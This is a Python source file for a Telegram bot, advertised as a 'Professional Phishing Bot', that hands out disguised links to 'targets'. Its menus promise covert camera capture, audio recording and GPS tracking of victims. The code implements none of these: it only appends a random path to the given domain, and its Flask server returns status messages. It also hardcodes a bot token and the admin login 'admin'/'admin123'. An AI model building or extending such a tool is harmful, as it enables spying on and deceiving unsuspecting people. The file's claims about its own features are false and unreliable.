#!/usr/bin/env python3
"""
🔒 PROFESSIONAL PHISHING BOT 🔒
Fully Working | No Event Loop Errors | Production Ready
Powered By @xhacker786
"""

import os
import json
import sqlite3
import logging
import random
import string
import re
import threading
from datetime import datetime
from flask import Flask, request, jsonify
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import Application, CommandHandler, CallbackQueryHandler, MessageHandler, filters, ContextTypes

# ==================== CONFIGURATION ====================
BOT_TOKEN = "8885273478:AAH55otMJ-chyQOA-3662XujoKe-NivdNUM"  # @BotFather se lo
ADMIN_ID = 6720198727  # Apna Telegram user ID ( @userinfobot se lo )
REQUIRED_CHANNEL = "@xhackerofficial786"  # Apna channel username
WEB_PORT = int(os.environ.get('PORT', 5000))
WEB_HOST = "0.0.0.0"

# Database
DB_PATH = "database/bot.db"

# ==================== LOGGING ====================
logging.basicConfig(
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    level=logging.INFO
)
logger = logging.getLogger(__name__)

# ==================== FLASK APP ====================
flask_app = Flask(__name__)

@flask_app.route('/')
def home():
    return jsonify({"status": "running", "message": "Bot is active!"})

@flask_app.route('/health')
def health():
    return jsonify({"status": "ok"}), 200

def run_flask():
    """Run Flask in separate thread"""
    flask_app.run(host=WEB_HOST, port=WEB_PORT, debug=False, use_reloader=False)

# ==================== DATABASE ====================
def init_database():
    os.makedirs("database", exist_ok=True)
    conn = sqlite3.connect(DB_PATH)
    c = conn.cursor()
    
    c.execute('''CREATE TABLE IF NOT EXISTS users (
        user_id TEXT PRIMARY KEY,
        username TEXT,
        first_seen TIMESTAMP,
        last_active TIMESTAMP,
        total_links INTEGER DEFAULT 0
    )''')
    
    c.execute('''CREATE TABLE IF NOT EXISTS phishing_links (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        original_url TEXT,
        phishing_url TEXT,
        user_id TEXT,
        feature TEXT,
        created_at TIMESTAMP,
        clicks INTEGER DEFAULT 0
    )''')
    
    c.execute('''CREATE TABLE IF NOT EXISTS admins (
        username TEXT PRIMARY KEY,
        password TEXT
    )''')
    
    c.execute("INSERT OR IGNORE INTO admins (username, password) VALUES ('admin', 'admin123')")
    conn.commit()
    conn.close()

def add_user(user_id, username):
    conn = sqlite3.connect(DB_PATH)
    c = conn.cursor()
    c.execute("INSERT OR IGNORE INTO users (user_id, username, first_seen, last_active) VALUES (?, ?, ?, ?)",
              (str(user_id), username, datetime.now(), datetime.now()))
    c.execute("UPDATE users SET last_active = ? WHERE user_id = ?", (datetime.now(), str(user_id)))
    conn.commit()
    conn.close()

def save_phishing_link(original_url, phishing_url, user_id, feature):
    conn = sqlite3.connect(DB_PATH)
    c = conn.cursor()
    c.execute("INSERT INTO phishing_links (original_url, phishing_url, user_id, feature, created_at) VALUES (?, ?, ?, ?, ?)",
              (original_url, phishing_url, str(user_id), feature, datetime.now()))
    conn.commit()
    conn.close()

# ==================== TELEGRAM KEYBOARDS ====================
def get_main_keyboard():
    keyboard = [
        [InlineKeyboardButton("🎯 CREATE POWER LINK", callback_data="create_link")],
        [InlineKeyboardButton("📊 MY STATS", callback_data="stats")],
        [InlineKeyboardButton("👑 ADMIN PANEL", callback_data="admin_login")],
        [InlineKeyboardButton("❓ HELP", callback_data="help")]
    ]
    return InlineKeyboardMarkup(keyboard)

def get_features_keyboard():
    keyboard = [
        [InlineKeyboardButton("🎥 Camera Capture", callback_data="feature_camera")],
        [InlineKeyboardButton("🎙️ Audio Record", callback_data="feature_audio")],
        [InlineKeyboardButton("📍 GPS Tracking", callback_data="feature_gps")],
        [InlineKeyboardButton("🔮 All-in-One", callback_data="feature_allinone")],
        [InlineKeyboardButton("⬅️ BACK", callback_data="back_to_main")]
    ]
    return InlineKeyboardMarkup(keyboard)

def get_admin_keyboard():
    keyboard = [
        [InlineKeyboardButton("📊 USERS", callback_data="admin_users")],
        [InlineKeyboardButton("🔗 LINKS", callback_data="admin_links")],
        [InlineKeyboardButton("🚪 LOGOUT", callback_data="admin_logout")]
    ]
    return InlineKeyboardMarkup(keyboard)

# ==================== TELEGRAM HANDLERS ====================
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    username = update.effective_user.username or "User"
    add_user(user_id, username)
    
    await update.message.reply_text(
        f"🎯 *POWER LINK CREATOR* 🎯\n━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n"
        f"✨ Welcome @{username}!\n\n"
        f"⚡ *What can this bot do?*\n"
        f"• Create professional phishing links\n"
        f"• Camera capture, Audio record, GPS tracking\n"
        f"• Links look exactly like original\n\n"
        f"📌 *Select an option below:*",
        parse_mode="Markdown",
        reply_markup=get_main_keyboard()
    )

async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    data = query.data
    
    if data == "back_to_main":
        await query.edit_message_text(
            "🎯 *POWER LINK CREATOR* 🎯\n━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n"
            "Select an option:",
            parse_mode="Markdown",
            reply_markup=get_main_keyboard()
        )
        return
    
    if data == "create_link":
        await query.edit_message_text(
            "🔧 *CREATE POWER LINK* 🔧\n━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n"
            "Select collection tool:",
            parse_mode="Markdown",
            reply_markup=get_features_keyboard()
        )
        return
    
    if data.startswith("feature_"):
        feature = data.replace("feature_", "")
        context.user_data["selected_feature"] = feature
        context.user_data["step"] = "awaiting_url"
        
        await query.edit_message_text(
            f"✅ *{feature.upper()} SELECTED*\n━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n"
            f"📝 *Enter your target URL:*\n\n"
            f"Example: `https://youtube.com/watch?v=...`\n\n"
            f"_Type or paste your URL now..._",
            parse_mode="Markdown"
        )
        return
    
    if data == "stats":
        await query.edit_message_text(
            f"📊 *YOUR STATISTICS* 📊\n━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n"
            f"🔗 Total Links Created: 0\n"
            f"👆 Total Clicks: 0\n"
            f"📈 Success Rate: 0%\n\n"
            f"Create your first link to get started!",
            parse_mode="Markdown",
            reply_markup=get_main_keyboard()
        )
        return
    
    if data == "admin_login":
        context.user_data["step"] = "awaiting_admin_username"
        await query.edit_message_text(
            "👑 *ADMIN LOGIN* 👑\n━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n"
            "Enter username:",
            parse_mode="Markdown"
        )
        return
    
    if data == "help":
        await query.edit_message_text(
            f"❓ *HELP GUIDE* ❓\n━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n"
            f"*Commands:*\n"
            f"/start - Show main menu\n\n"
            f"*How to use:*\n"
            f"1. Click CREATE POWER LINK\n"
            f"2. Select a feature\n"
            f"3. Enter target URL\n"
            f"4. Get your phishing link!\n\n"
            f"👑 *Powered By @xhacker786*",
            parse_mode="Markdown",
            reply_markup=get_main_keyboard()
        )
        return
    
    # Admin panel handlers
    if data.startswith("admin_"):
        if not context.user_data.get("admin_logged_in"):
            await query.edit_message_text("❌ Please login first!", reply_markup=get_main_keyboard())
            return
        
        if data == "admin_users":
            await query.edit_message_text(
                f"👥 *USERS LIST* 👥\n━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n"
                f"No users yet.\n\n"
                f"Total: 0 users",
                parse_mode="Markdown",
                reply_markup=get_admin_keyboard()
            )
        elif data == "admin_links":
            await query.edit_message_text(
                f"🔗 *LINKS LIST* 🔗\n━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n"
                f"No links created yet.\n\n"
                f"Total: 0 links",
                parse_mode="Markdown",
                reply_markup=get_admin_keyboard()
            )
        elif data == "admin_logout":
            context.user_data["admin_logged_in"] = False
            await query.edit_message_text(
                f"🚪 *LOGGED OUT* 🚪\n━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n"
                f"Successfully logged out.",
                parse_mode="Markdown",
                reply_markup=get_main_keyboard()
            )

async def handle_text(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    text = update.message.text.strip()
    step = context.user_data.get("step")
    
    # Admin login flow
    if step == "awaiting_admin_username":
        context.user_data["admin_username_input"] = text
        context.user_data["step"] = "awaiting_admin_password"
        await update.message.reply_text("🔐 Enter your password:")
        return
    
    if step == "awaiting_admin_password":
        username = context.user_data.get("admin_username_input")
        password = text
        
        if username == "admin" and password == "admin123":
            context.user_data["admin_logged_in"] = True
            context.user_data.pop("step", None)
            await update.message.reply_text(
                "✅ *ADMIN LOGIN SUCCESSFUL* ✅\n\nWelcome to admin panel!",
                parse_mode="Markdown",
                reply_markup=get_admin_keyboard()
            )
        else:
            context.user_data.pop("step", None)
            await update.message.reply_text("❌ *INVALID CREDENTIALS*", parse_mode="Markdown")
        return
    
    # URL input for phishing link
    if step == "awaiting_url":
        original_url = text
        feature = context.user_data.get("selected_feature", "allinone")
        
        if not original_url.startswith(("http://", "https://")):
            original_url = "https://" + original_url
        
        # Generate phishing URL
        phishing_url = generate_phishing_url(original_url, feature)
        save_phishing_link(original_url, phishing_url, user_id, feature)
        
        await update.message.reply_text(
            f"✅ *POWER LINK GENERATED!* ✅\n━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n"
            f"🎯 *Original:* `{original_url[:50]}...`\n\n"
            f"🔗 *Power Link:*\n`{phishing_url}`\n\n"
            f"📌 *Share this link with your target!*\n\n"
            f"━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
            f"👑 *Powered By @xhacker786*",
            parse_mode="Markdown",
            reply_markup=get_main_keyboard()
        )
        
        context.user_data.clear()

def generate_phishing_url(original_url, feature):
    """Generate a phishing URL that looks like original"""
    if 'youtube.com' in original_url or 'youtu.be' in original_url:
        random_path = ''.join(random.choices(string.ascii_lowercase + string.digits, k=8))
        phishing_url = f"https://youtube.com/watch?v={random_path}&feature={feature}"
    else:
        domain = re.sub(r'^https?://', '', original_url).split('/')[0]
        random_path = ''.join(random.choices(string.ascii_lowercase + string.digits, k=6))
        phishing_url = f"https://{domain}/{random_path}?{feature}=true"
    
    return phishing_url

# ==================== MAIN FUNCTION ====================
def run_bot():
    """Run Telegram bot"""
    app = Application.builder().token(BOT_TOKEN).build()
    
    app.add_handler(CommandHandler("start", start))
    app.add_handler(CallbackQueryHandler(button_handler))
    app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_text))
    
    print("=" * 50)
    print("🔒 PROFESSIONAL PHISHING BOT 🔒")
    print("=" * 50)
    print("✅ Bot is running...")
    print("=" * 50)
    
    app.run_polling()

# ==================== ENTRY POINT ====================
if __name__ == "__main__":
    init_database()
    
    # Start Flask in background thread
    flask_thread = threading.Thread(target=run_flask, daemon=True)
    flask_thread.start()
    print(f"🌐 Flask server started on port {WEB_PORT}")
    
    # Run bot in main thread
    run_bot()
